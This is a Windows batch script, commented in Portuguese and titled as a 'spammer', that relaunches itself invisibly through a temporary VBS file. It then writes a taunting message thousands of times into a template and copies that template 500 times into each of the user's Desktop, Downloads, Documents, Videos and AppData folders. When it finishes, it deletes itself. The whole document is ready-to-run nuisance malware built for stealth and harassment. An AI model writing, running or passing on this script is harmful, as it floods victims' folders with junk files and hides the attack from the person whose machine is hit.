@echo off
setlocal enabledelayedexpansion

REM ============================================================
REM  Lxzinn__ spammer
REM  - Roda escondido (sem janela)
REM  - Cria arquivos em Desktop, Downloads, Documents, Videos,
REM    AppData\Roaming (%APPDATA%) e AppData\Local (%LOCALAPPDATA%)
REM  - Se auto-deleta ao terminar
REM  Salve como ANSI (não UTF-8) pra evitar BOM
REM ============================================================

REM ==== EDITE AQUI ====
set qtd=10000
set texto=Lxzinn__ passou por aq otario KKKKKK
set arquivos_por_pasta=500
REM ====================

REM ---- 1) Se não foi relançado com a flag, esconde e relança via VBS ----
if /i not "%~1"=="__hidden__" (
    set "vbs=%TEMP%\~rh_%RANDOM%.vbs"
    > "!vbs!" echo CreateObject("WScript.Shell").Run """%~f0"" __hidden__", 0, False
    wscript //nologo "!vbs!"
    del /f /q "!vbs!" >nul 2>&1
    exit /b
)

REM ---- 2) Daqui pra baixo roda escondido ----

REM Template único com as N linhas (cria rápido)
set "template=%TEMP%\_t_%RANDOM%.txt"
> "%template%" (
    for /L %%i in (1,1,%qtd%) do echo %texto%
)

REM ---- 3) Copia o template pra cada pasta alvo ----
for %%D in (
    "%USERPROFILE%\Desktop"
    "%USERPROFILE%\Downloads"
    "%USERPROFILE%\Documents"
    "%USERPROFILE%\Videos"
    "%APPDATA%"
    "%LOCALAPPDATA%"
) do (
    call :faz "%%~D"
)

del /f /q "%template%" >nul 2>&1

REM ---- 4) Auto-delete (espera 2s e apaga o próprio .bat) ----
start "" /b cmd /c "timeout /t 2 /nobreak >nul & del /f /q ""%~f0"""
exit /b 0

:faz
set "pasta=%~1"
if not exist "%pasta%" exit /b
for /L %%f in (1,1,%arquivos_por_pasta%) do (
    copy /y "%template%" "%pasta%\Lxzinn__%%f.txt" >nul 2>&1
)
exit /b
